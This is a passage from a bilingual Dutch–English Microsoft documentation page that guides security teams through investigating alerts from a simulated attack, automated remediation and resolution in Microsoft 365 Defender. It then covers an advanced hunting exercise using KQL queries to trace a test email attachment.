><span data-ttu-id="2baee-211">Omdat deze melding wordt weergegeven op basis van computer-trainings modellen waarvoor extra backend-verwerking is vereist, kan het enige tijd duren voordat deze melding wordt weergegeven op de portal.</span><span class="sxs-lookup"><span data-stu-id="2baee-211">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="2baee-212">U ziet dat de details van de waarschuwing ook het externe IP-adres zijn: een indicator die u kunt gebruiken als draai om onderzoek uit te vouwen.</span><span class="sxs-lookup"><span data-stu-id="2baee-212">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="2baee-213">Selecteer het IP-adres in de structuur van het waarschuwings proces om de pagina met IP-adresdetails weer te geven.</span><span class="sxs-lookup"><span data-stu-id="2baee-213">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![Schermafbeelding van de waarschuwing voor onverwachte werking van een proces dat wordt uitgevoerd zonder opdrachtregelargumenten](../../media/mtp/fig8.png) 

<span data-ttu-id="2baee-215">In de volgende afbeelding ziet u de geselecteerde pagina met details van IP-adres (Klik op IP-adres in de boomstructuur van het waarschuwings proces).</span><span class="sxs-lookup"><span data-stu-id="2baee-215">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>
<span data-ttu-id="2baee-216">![Schermafbeelding van de pagina Details van IP-adres](../../media/mtp/fig9.png)</span><span class="sxs-lookup"><span data-stu-id="2baee-216">![Screenshot of the IP address details page](../../media/mtp/fig9.png)</span></span>


<span data-ttu-id="2baee-217">**Waarschuwing: gebruikers-en IP-adres Reconnaissance (SMB) (Bron: Microsoft Defender for Identity)**</span><span class="sxs-lookup"><span data-stu-id="2baee-217">**Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)**</span></span>

<span data-ttu-id="2baee-218">Met behulp van inventarisatie met behulp van SMB-protocol (Server Message Block) kunnen hackers recente gebruikers aanmeldinformatie verkrijgen waarmee ze later via het netwerk kunnen navigeren om toegang te krijgen tot een specifiek gevoelige account.</span><span class="sxs-lookup"><span data-stu-id="2baee-218">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="2baee-219">Bij deze detectie wordt een waarschuwing geactiveerd wanneer de SMB-sessie inventarisatie wordt uitgevoerd voor een domeincontroller.</span><span class="sxs-lookup"><span data-stu-id="2baee-219">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![Schermafbeelding van de Microsoft Defender for identiteits waarschuwing voor gebruikers-en IP-adres Reconnaissance](../../media/mtp/fig10.png) 


### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a><span data-ttu-id="2baee-221">De tijdlijn van het apparaat controleren [Microsoft Defender for endpoints]</span><span class="sxs-lookup"><span data-stu-id="2baee-221">Review the device timeline [Microsoft Defender for Endpoint]</span></span>
<span data-ttu-id="2baee-222">Wanneer u de verschillende meldingen in dit incident hebt onderzocht, gaat u terug naar de pagina met het incident dat u eerder hebt onderzocht.</span><span class="sxs-lookup"><span data-stu-id="2baee-222">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="2baee-223">Selecteer het tabblad **apparaten** op de pagina met incidenten om de apparaten in dit incident te bekijken zoals gerapporteerd door Microsoft Defender voor eindpunten en Microsoft Defender for Identity.</span><span class="sxs-lookup"><span data-stu-id="2baee-223">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.</span></span>

<span data-ttu-id="2baee-224">Selecteer de naam van het apparaat waarop de aanval is uitgevoerd om de entiteits pagina voor dat specifieke apparaat te openen.</span><span class="sxs-lookup"><span data-stu-id="2baee-224">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="2baee-225">Op deze pagina kunt u waarschuwingen weergeven die zijn geactiveerd en de gerelateerde gebeurtenissen.</span><span class="sxs-lookup"><span data-stu-id="2baee-225">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="2baee-226">Selecteer het tabblad **tijdlijn** om de tijdlijn van het apparaat te openen en alle gebeurtenissen en gedragingen op het apparaat in chronologische volgorde weer te geven, waarbij de waarschuwingen zijn getreden.</span><span class="sxs-lookup"><span data-stu-id="2baee-226">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![Schermafbeelding van de tijdlijn van het apparaat met gedrag](../../media/mtp/fig11.png) 

<span data-ttu-id="2baee-228">Het uitvouwen van een paar van de interessantere gedragingen bieden nuttige informatie, zoals proces bomen.</span><span class="sxs-lookup"><span data-stu-id="2baee-228">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="2baee-229">Schuif bijvoorbeeld omlaag totdat u bij de gebeurtenis **verdacht verdacht proces de injectie** vindt.</span><span class="sxs-lookup"><span data-stu-id="2baee-229">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="2baee-230">Selecteer de **powershell.exe die zijn geïnjecteerd naar notepad.exe proces** gebeurtenis eronder, om de volledige processtructuur weer te geven voor dit gedrag onder de grafiek **gebeurtenis entiteiten** in het zijvenster.</span><span class="sxs-lookup"><span data-stu-id="2baee-230">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="2baee-231">Gebruik de zoekbalk om zo nodig te filteren.</span><span class="sxs-lookup"><span data-stu-id="2baee-231">Use the search bar for filtering if necessary.</span></span>

![Schermafbeelding van de processtructuur voor het geselecteerde gedrag van het maken van PowerShell-bestanden](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a><span data-ttu-id="2baee-233">Controleer de gebruikersgegevens [Microsoft Cloud app security]</span><span class="sxs-lookup"><span data-stu-id="2baee-233">Review the user information [Microsoft Cloud App Security]</span></span>

<span data-ttu-id="2baee-234">Selecteer op de pagina incident het tabblad **gebruikers** om de lijst met gebruikers weer te geven die betrokken zijn bij de aanval.</span><span class="sxs-lookup"><span data-stu-id="2baee-234">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="2baee-235">De tabel bevat extra informatie over elke gebruiker, waaronder de **onderzoek prioriteit** van elke gebruiker.</span><span class="sxs-lookup"><span data-stu-id="2baee-235">The table contains additional information about each user, including each user’s **Investigation Priority** score.</span></span>

<span data-ttu-id="2baee-236">Selecteer de gebruikersnaam om de profielpagina van de gebruiker te openen waar verder onderzoek kan worden uitgevoerd.</span><span class="sxs-lookup"><span data-stu-id="2baee-236">Select the user name to open the user’s profile page where further investigation can be conducted.</span></span> <span data-ttu-id="2baee-237">[Meer informatie over het onderzoeken van risico gebruikers](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span><span class="sxs-lookup"><span data-stu-id="2baee-237">[Read more about investigating risky users](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span></span>
<br>
<span data-ttu-id="2baee-238">![Schermafbeelding van de pagina met beveiligings gebruikers van de Cloud-app](../../media/mtp/fig13.png)</span><span class="sxs-lookup"><span data-stu-id="2baee-238">![Screenshot of Cloud App Security user page](../../media/mtp/fig13.png)</span></span>


## <a name="automated-investigation-and-remediation"></a><span data-ttu-id="2baee-239">Automatisch onderzoek en herstel</span><span class="sxs-lookup"><span data-stu-id="2baee-239">Automated investigation and remediation</span></span>
>[!NOTE]
><span data-ttu-id="2baee-240">Voordat u via deze simulatie verdergaat, bekijkt u de volgende video om vertrouwd te raken met wat automatisch herstel is, waar u het kunt vinden in de portal en hoe u het kunt helpen bij uw beveiligingsactiviteiten:</span><span class="sxs-lookup"><span data-stu-id="2baee-240">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="2baee-241">Ga terug naar het incident in het Microsoft 365 Security Center Portal.</span><span class="sxs-lookup"><span data-stu-id="2baee-241">Navigate back to the incident in the Microsoft 365 Security Center portal.</span></span> <span data-ttu-id="2baee-242">Het tabblad **onderzoeken** op de pagina **incident** toont de geautomatiseerde onderzoeken die zijn geactiveerd door Microsoft Defender voor de identiteit en Microsoft Defender for Endpoint.</span><span class="sxs-lookup"><span data-stu-id="2baee-242">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint.</span></span> <span data-ttu-id="2baee-243">Met de onderstaande schermafbeelding wordt alleen het geautomatiseerd onderzoek weergegeven dat door Defender voor eindpunt is geactiveerd.</span><span class="sxs-lookup"><span data-stu-id="2baee-243">The screenshot below displays only the automated investigation triggered by Defender for Endpoint.</span></span> <span data-ttu-id="2baee-244">In het eindpunt voor eindpunten worden standaard de artefacten die zijn gevonden in de wachtrij, automatisch hersteld waarvoor herstel nodig is.</span><span class="sxs-lookup"><span data-stu-id="2baee-244">By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![Schermafbeelding van geautomatiseerde onderzoeken met betrekking tot het incident](../../media/mtp/fig14.png)

<span data-ttu-id="2baee-246">Selecteer de waarschuwing die een onderzoek heeft geactiveerd om de pagina **Details van onderzoek** te openen.</span><span class="sxs-lookup"><span data-stu-id="2baee-246">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="2baee-247">U ziet de volgende informatie:</span><span class="sxs-lookup"><span data-stu-id="2baee-247">You’ll see the following details:</span></span>
- <span data-ttu-id="2baee-248">Waarschuwing (s) die het geautomatiseerde onderzoek hebben geactiveerd.</span><span class="sxs-lookup"><span data-stu-id="2baee-248">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="2baee-249">Beïnvloede gebruikers en apparaten.</span><span class="sxs-lookup"><span data-stu-id="2baee-249">Impacted users and devices.</span></span> <span data-ttu-id="2baee-250">Als indicatoren zijn gevonden op extra apparaten, worden deze extra apparaten ook weergegeven.</span><span class="sxs-lookup"><span data-stu-id="2baee-250">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="2baee-251">Lijst met bewijzen.</span><span class="sxs-lookup"><span data-stu-id="2baee-251">List of evidence.</span></span> <span data-ttu-id="2baee-252">De entiteiten zijn gevonden en geanalyseerd, zoals bestanden, processen, services, Stuurprogramma's en netwerkadressen.</span><span class="sxs-lookup"><span data-stu-id="2baee-252">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="2baee-253">Deze entiteiten worden geanalyseerd op mogelijke relaties voor de waarschuwing en zijn geclassificeerd als schadelijk of schadelijk.</span><span class="sxs-lookup"><span data-stu-id="2baee-253">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="2baee-254">Bedreigingen gevonden.</span><span class="sxs-lookup"><span data-stu-id="2baee-254">Threats found.</span></span> <span data-ttu-id="2baee-255">Bekende bedreigingen die tijdens het onderzoek zijn gevonden.</span><span class="sxs-lookup"><span data-stu-id="2baee-255">Known threats that are found during the investigation.</span></span>

>[!NOTE]
><span data-ttu-id="2baee-256">Afhankelijk van de tijdsinstellingen, kan het geautomatiseerde onderzoek mogelijk nog steeds actief zijn.</span><span class="sxs-lookup"><span data-stu-id="2baee-256">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="2baee-257">Wacht een paar minuten totdat het proces is voltooid voordat u het bewijs gaat verzamelen en analyseren en Bekijk de resultaten.</span><span class="sxs-lookup"><span data-stu-id="2baee-257">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="2baee-258">Vernieuw de pagina met **onderzoek Details** om de meest recente bevindingen te vinden.</span><span class="sxs-lookup"><span data-stu-id="2baee-258">Refresh the **Investigation details** page to get the latest findings.</span></span>

![Schermafbeelding van de pagina Details van onderzoek](../../media/mtp/fig15.png)

<span data-ttu-id="2baee-260">Tijdens het geautomatiseerde onderzoek heeft Microsoft Defender voor eindpunt de notepad.exe proces geïdentificeerd, dat is geïnjecteerd als een van de artefacten waarvoor herstel nodig is.</span><span class="sxs-lookup"><span data-stu-id="2baee-260">During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="2baee-261">Met eindpunten voor eindpunt worden de verdachte proces injectie automatisch beëindigd als onderdeel van de geautomatiseerde herstelprocedure.</span><span class="sxs-lookup"><span data-stu-id="2baee-261">Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.</span></span> 

<span data-ttu-id="2baee-262">U kunt <i>notepad.exe</i> verdwijnen uit de lijst met actieve processen op het testapparaat.</span><span class="sxs-lookup"><span data-stu-id="2baee-262">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

## <a name="resolve-the-incident"></a><span data-ttu-id="2baee-263">Het incident oplossen</span><span class="sxs-lookup"><span data-stu-id="2baee-263">Resolve the incident</span></span>

<span data-ttu-id="2baee-264">Wanneer het onderzoek is voltooid en bevestigd, moet u het incident sluiten.</span><span class="sxs-lookup"><span data-stu-id="2baee-264">After the investigation is complete and confirmed to be remediated, close the incident.</span></span>

<span data-ttu-id="2baee-265">Selecteer **incident beheren**.</span><span class="sxs-lookup"><span data-stu-id="2baee-265">Select **Manage incident**.</span></span> <span data-ttu-id="2baee-266">Stel de status voor het **oplossen van incidenten** in en selecteer de gewenste classificatie.</span><span class="sxs-lookup"><span data-stu-id="2baee-266">Set the status to **Resolve incident** and select the relevant classification.</span></span>

<span data-ttu-id="2baee-267">Wanneer het incident is opgelost, worden alle bijbehorende waarschuwingen in Microsoft 365 Beveiligingscentrum en in de bijbehorende portals gesloten.</span><span class="sxs-lookup"><span data-stu-id="2baee-267">When the incident is resolved, it closes all of the associated alerts in Microsoft 365 Security Center and in the related portals.</span></span>

![Schermafbeelding van de pagina met incidenten, waarop u kunt klikken op de schakeloptie om het probleem op te lossen](../../media/mtp/fig16.png) 

<br>
<span data-ttu-id="2baee-269">Hiermee wordt de simulatie van de aanval voor incidentenbeheer en voor automatisch onderzoek en herstelscenario's gewikkeld.</span><span class="sxs-lookup"><span data-stu-id="2baee-269">This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.</span></span> <span data-ttu-id="2baee-270">Met de volgende simulatie wordt u begeleid bij het maken van een proactieve bedreiging van de jacht voor potentieel schadelijke bestanden.</span><span class="sxs-lookup"><span data-stu-id="2baee-270">The next simulation will take you through proactive threat hunting for potentially malicious files.</span></span> 

## <a name="advanced-hunting-scenario"></a><span data-ttu-id="2baee-271">Scenario voor Geavanceerd jacht</span><span class="sxs-lookup"><span data-stu-id="2baee-271">Advanced hunting scenario</span></span>

>[!NOTE]
><span data-ttu-id="2baee-272">Bekijk de volgende video voor meer informatie over de basisbeginselen van de ervaring, zie waar u deze kunt vinden in de portal en hoe u het kunt helpen bij het uitvoeren van beveiligingsbewerkingen:</span><span class="sxs-lookup"><span data-stu-id="2baee-272">Before we walk you through the simulation, watch the following video to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a><span data-ttu-id="2baee-273">Voorschriften voor de jacht omgeving</span><span class="sxs-lookup"><span data-stu-id="2baee-273">Hunting environment requirements</span></span>
<span data-ttu-id="2baee-274">Er is één intern postvak en apparaat vereist voor dit scenario.</span><span class="sxs-lookup"><span data-stu-id="2baee-274">There's a single internal mailbox and device required for this scenario.</span></span> <span data-ttu-id="2baee-275">U hebt ook een extern e-mailaccount nodig om het testbericht te verzenden.</span><span class="sxs-lookup"><span data-stu-id="2baee-275">You'll also need an external email account to send the test message.</span></span>

1.  <span data-ttu-id="2baee-276">Controleer of uw Tenant [Microsoft 365 Defender heeft ingeschakeld](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span><span class="sxs-lookup"><span data-stu-id="2baee-276">Verify that your tenant has [enabled Microsoft 365 Defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>
2.  <span data-ttu-id="2baee-277">Aangeven dat een doel postvak moet worden gebruikt voor het ontvangen van e-mail.</span><span class="sxs-lookup"><span data-stu-id="2baee-277">Identify a target mailbox to be used for receiving email.</span></span>
    <span data-ttu-id="2baee-278">a.</span><span class="sxs-lookup"><span data-stu-id="2baee-278">a.</span></span>  <span data-ttu-id="2baee-279">Dit postvak moet worden gecontroleerd door Microsoft Defender for Office 365 b.</span><span class="sxs-lookup"><span data-stu-id="2baee-279">This mailbox must be monitored by Microsoft Defender for Office 365 b.</span></span>  <span data-ttu-id="2baee-280">Het apparaat van behoefte 3 moet toegang hebben tot dit postvak</span><span class="sxs-lookup"><span data-stu-id="2baee-280">The device from requirement 3 needs to access this mailbox</span></span>
3.  <span data-ttu-id="2baee-281">Configureer een testapparaat: a.</span><span class="sxs-lookup"><span data-stu-id="2baee-281">Configure a test device: a.</span></span>  <span data-ttu-id="2baee-282">Zorg dat u Windows 10 versie 1903 of hoger gebruikt.</span><span class="sxs-lookup"><span data-stu-id="2baee-282">Make sure you are using Windows 10 version 1903 or later version.</span></span>
    <span data-ttu-id="2baee-283">b.</span><span class="sxs-lookup"><span data-stu-id="2baee-283">b.</span></span>  <span data-ttu-id="2baee-284">Neem deel aan het test domein.</span><span class="sxs-lookup"><span data-stu-id="2baee-284">Join the test device to the test domain.</span></span>
    <span data-ttu-id="2baee-285">c.</span><span class="sxs-lookup"><span data-stu-id="2baee-285">c.</span></span>  <span data-ttu-id="2baee-286">[Schakel Windows Defender antivirus in](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span><span class="sxs-lookup"><span data-stu-id="2baee-286">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="2baee-287">Als u problemen ondervindt bij het inschakelen van Windows Defender antivirus, raadpleegt u [dit onderwerp over probleemoplossing](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span><span class="sxs-lookup"><span data-stu-id="2baee-287">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <span data-ttu-id="2baee-288">d.</span><span class="sxs-lookup"><span data-stu-id="2baee-288">d.</span></span>  <span data-ttu-id="2baee-289">[Onboarding to Microsoft Defender for Endpoint](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span><span class="sxs-lookup"><span data-stu-id="2baee-289">[Onboard to Microsoft Defender for Endpoint](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

### <a name="run-the-simulation"></a><span data-ttu-id="2baee-290">De simulatie uitvoeren</span><span class="sxs-lookup"><span data-stu-id="2baee-290">Run the simulation</span></span>
1.  <span data-ttu-id="2baee-291">Stuur via een extern e-mailaccount een e-mailbericht naar het postvak dat is gevonden in stap 2 van de sectie vereisten voor testomgeving.</span><span class="sxs-lookup"><span data-stu-id="2baee-291">From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.</span></span> <span data-ttu-id="2baee-292">Voeg een bijlage toe die wordt toegestaan via elk bestaand e-mail filter beleid.</span><span class="sxs-lookup"><span data-stu-id="2baee-292">Include an attachment that will be allowed through any existing email filter policies.</span></span>  <span data-ttu-id="2baee-293">Dit bestand hoeft niet te zijn schadelijk of een uitvoerbaar bestand.</span><span class="sxs-lookup"><span data-stu-id="2baee-293">This file does not need to be malicious or an executable.</span></span> <span data-ttu-id="2baee-294">Voorgestelde bestandstypen zijn <i>. PDF</i>, <i>. exe</i> (indien toegestaan) of Office-document, zoals een Word-bestand.</span><span class="sxs-lookup"><span data-stu-id="2baee-294">Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.</span></span>
2.  <span data-ttu-id="2baee-295">Open het verzonden e-mailbericht van het apparaat dat is geconfigureerd in stap 3 van de sectie omgevingsvereisten testen.</span><span class="sxs-lookup"><span data-stu-id="2baee-295">Open the sent email from the device configured as defined in step 3 of the test environment requirements section.</span></span> <span data-ttu-id="2baee-296">Open de bijlage of sla het bestand op het apparaat op.</span><span class="sxs-lookup"><span data-stu-id="2baee-296">Either open the attachment or save the file to the device.</span></span>


<span data-ttu-id="2baee-297">**Go-jacht**</span><span class="sxs-lookup"><span data-stu-id="2baee-297">**Go hunting**</span></span>
1.  <span data-ttu-id="2baee-298">Open de portal van security.microsoft.com.</span><span class="sxs-lookup"><span data-stu-id="2baee-298">Open the security.microsoft.com portal.</span></span>

2.  <span data-ttu-id="2baee-299">Ga naar de **jacht > geavanceerde jacht**.</span><span class="sxs-lookup"><span data-stu-id="2baee-299">Navigate to **Hunting > Advanced hunting**.</span></span>

    ![Schermafbeelding van een geavanceerde jacht op de navigatiebalk van het M365 Security Center Portal](../../media/mtp/fig17.png) 

3.  <span data-ttu-id="2baee-301">Maak een query die begint met het verzamelen van e-mail gebeurtenissen.</span><span class="sxs-lookup"><span data-stu-id="2baee-301">Build a query that starts by gathering email events.</span></span>

    1.  <span data-ttu-id="2baee-302">Selecteer in het deelvenster query de optie Nieuw.</span><span class="sxs-lookup"><span data-stu-id="2baee-302">From the query pane, select New.</span></span>
    
    1.  <span data-ttu-id="2baee-303">Dubbelklik op de tabel EmailEvents van het schema.</span><span class="sxs-lookup"><span data-stu-id="2baee-303">Double-click on the EmailEvents table from the schema.</span></span>

        ```
        EmailEvents 
        ```                                        

    1.  <span data-ttu-id="2baee-304">De laatste 24 uur van het tijdsbestek wijzigen.</span><span class="sxs-lookup"><span data-stu-id="2baee-304">Change the time frame to the last 24 hours.</span></span> <span data-ttu-id="2baee-305">Ervan uitgaand dat de e-mail die u hebt verzonden toen u de bovenstaande simulatie uitvoerde, stond in de afgelopen 24 uur, anders wijzigt u de tijdsperiode.</span><span class="sxs-lookup"><span data-stu-id="2baee-305">Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.</span></span>
    
        ![Schermafbeelding van de locatie waar u de periode kunt wijzigen.](../../media/mtp/fig18.png) 

    1.  <span data-ttu-id="2baee-308">Voer de query uit.</span><span class="sxs-lookup"><span data-stu-id="2baee-308">Run the query.</span></span>  <span data-ttu-id="2baee-309">Het kan zijn dat u veel resultaten hebt, afhankelijk van de omgeving van de prototype.</span><span class="sxs-lookup"><span data-stu-id="2baee-309">You may have many results depending on the environment for the pilot.</span></span>  

        > [!NOTE]
        > <span data-ttu-id="2baee-310">Zie de volgende stap voor het filteren van opties om het resultaat van de gegevens te beperken.</span><span class="sxs-lookup"><span data-stu-id="2baee-310">See the next step for filtering options to limit data return.</span></span>

        ![Schermafbeelding van de zoekresultaten van de geavanceerde jacht](../../media/mtp/fig19.png) 

        > [!NOTE]
        > <span data-ttu-id="2baee-312">Geavanceerde jacht geeft queryresultaten weer als tabelgegevens.</span><span class="sxs-lookup"><span data-stu-id="2baee-312">Advanced hunting displays query results as tabular data.</span></span> <span data-ttu-id="2baee-313">U kunt ook kiezen voor het weergeven van de gegevens in andere notatie typen, zoals grafieken.</span><span class="sxs-lookup"><span data-stu-id="2baee-313">You can also opt to view the data in other format types such as charts.</span></span>    

    1.  <span data-ttu-id="2baee-314">Bekijk de resultaten en kijk of u het e-mailbericht dat u hebt geopend kunt identificeren.</span><span class="sxs-lookup"><span data-stu-id="2baee-314">Look at the results and see if you can identify the email you opened.</span></span>  <span data-ttu-id="2baee-315">Het kan tot 2 uur duren voordat het bericht in de geavanceerde jacht wordt weergegeven.</span><span class="sxs-lookup"><span data-stu-id="2baee-315">It may take up to 2 hours for the message to show up in advanced hunting.</span></span> <span data-ttu-id="2baee-316">Als de e-mail omgeving grote en veel resultaten bevat, kunt u de **optie filters weergeven** gebruiken om het bericht te zoeken.</span><span class="sxs-lookup"><span data-stu-id="2baee-316">If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message.</span></span> 

           <span data-ttu-id="2baee-317">In het voorbeeld is het e-mailbericht verzonden via een Yahoo-account.</span><span class="sxs-lookup"><span data-stu-id="2baee-317">In the sample, the email was sent from a Yahoo account.</span></span> <span data-ttu-id="2baee-318">Klik op het **+** pictogram naast **Yahoo.com** onder de sectie SenderFromDomain en klik vervolgens op **toepassen** om het geselecteerde domein toe te voegen aan de query.</span><span class="sxs-lookup"><span data-stu-id="2baee-318">Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.</span></span>  <span data-ttu-id="2baee-319">Gebruik het domein of e-mailaccount dat is gebruikt voor het verzenden van het testbericht in stap 1 van de simulatie uitvoeren om de resultaten te filteren.</span><span class="sxs-lookup"><span data-stu-id="2baee-319">Use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.</span></span>  <span data-ttu-id="2baee-320">Voer de query opnieuw uit om een kleinere resultatenset te krijgen om te controleren of het bericht in de simulatie wordt weergegeven.</span><span class="sxs-lookup"><span data-stu-id="2baee-320">Run the query again to get a smaller result set to verify that you see the message from the simulation.</span></span>
   
        ![Schermafbeelding van de filters.](../../media/mtp/fig20.png) 

        ```console
        EmailEvents 
        | where SenderMailFromDomain == "yahoo.com"
        ```

    1.  <span data-ttu-id="2baee-323">Klik op de uitkomst rijen van de query, zodat u de record kunt controleren.</span><span class="sxs-lookup"><span data-stu-id="2baee-323">Click the resulting rows from the query so you can inspect the record.</span></span>
   
        ![Schermafbeelding van het deelvenster opnemen van de controle die wordt geopend wanneer een geavanceerd zoekresultaat wordt geselecteerd](../../media/mtp/fig21.png) 

4.  <span data-ttu-id="2baee-325">Nu u hebt gecontroleerd of u het e-mailbericht kunt zien, voegt u een filter toe voor de bijlagen.</span><span class="sxs-lookup"><span data-stu-id="2baee-325">Now that you have verified that you can see the email, add a filter for the attachments.</span></span> <span data-ttu-id="2baee-326">Richt u op alle e-mailberichten met bijlagen in de omgeving.</span><span class="sxs-lookup"><span data-stu-id="2baee-326">Focus on all emails with attachments in the environment.</span></span> <span data-ttu-id="2baee-327">Voor dit scenario zijn de focus op inkomende e-mailberichten, niet voor berichten die vanuit uw omgeving worden verzonden.</span><span class="sxs-lookup"><span data-stu-id="2baee-327">For this scenario, focus on inbound emails, not those that are being sent out from your environment.</span></span> <span data-ttu-id="2baee-328">Verwijder filters die u hebt toegevoegd om het bericht op te halen en voeg "| waarbij **AttachmentCount > 0** en **EmailDirection**  ==  **"inkomende" "**</span><span class="sxs-lookup"><span data-stu-id="2baee-328">Remove any filters you have added to locate your message and add “| where **AttachmentCount > 0** and **EmailDirection** == **“Inbound””**</span></span>

    <span data-ttu-id="2baee-329">In de volgende query ziet u het resultaat voor een kortere lijst dan de aanvankelijke query voor alle e-mail gebeurtenissen:</span><span class="sxs-lookup"><span data-stu-id="2baee-329">The following query will show you the result with a shorter list than your initial query for all email events:</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"

    ```

5.  <span data-ttu-id="2baee-330">Neem vervolgens de informatie over de bijlage op (bijvoorbeeld: bestandsnaam, hashes) in de resultatenset.</span><span class="sxs-lookup"><span data-stu-id="2baee-330">Next, include the information about the attachment (such as: file name, hashes) to your result set.</span></span> <span data-ttu-id="2baee-331">U kunt dit doen door lid te worden van de tabel **EmailAttachmentInfo** .</span><span class="sxs-lookup"><span data-stu-id="2baee-331">To do so, join the **EmailAttachmentInfo** table.</span></span> <span data-ttu-id="2baee-332">De veelgebruikte velden die u kunt gebruiken om deel te nemen in dit geval zijn **NetworkMessageId** en **RecipientObjectId**.</span><span class="sxs-lookup"><span data-stu-id="2baee-332">The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.</span></span>

    <span data-ttu-id="2baee-333">De volgende query bevat ook een extra regel | **Project: Wijzig de naam van EmailTimestamp = tijdstempel,** zodat u kunt zien welke tijdstempels zijn gerelateerd aan de e-mail en tijdstempels die u toevoegt aan de volgende stap.</span><span class="sxs-lookup"><span data-stu-id="2baee-333">The following query also includes an additional line “| **project-rename EmailTimestamp=Timestamp**” that'll help identify which timestamp was related to the email versus timestamps related to file actions that you'll add in the next step.</span></span>

    ```console
    EmailEvents 
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp 
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    ```

6.  <span data-ttu-id="2baee-334">Gebruik vervolgens de waarde **sha256** in de tabel **EmailAttachmentInfo** om **DeviceFileEvents** (bestandsacties die op het eindpunt plaatsvond) voor die hash te zoeken.</span><span class="sxs-lookup"><span data-stu-id="2baee-334">Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.</span></span>  <span data-ttu-id="2baee-335">Het veld gebruikelijk is de SHA256-hash voor de bijlage.</span><span class="sxs-lookup"><span data-stu-id="2baee-335">The common field here will be the SHA256 hash for the attachment.</span></span>

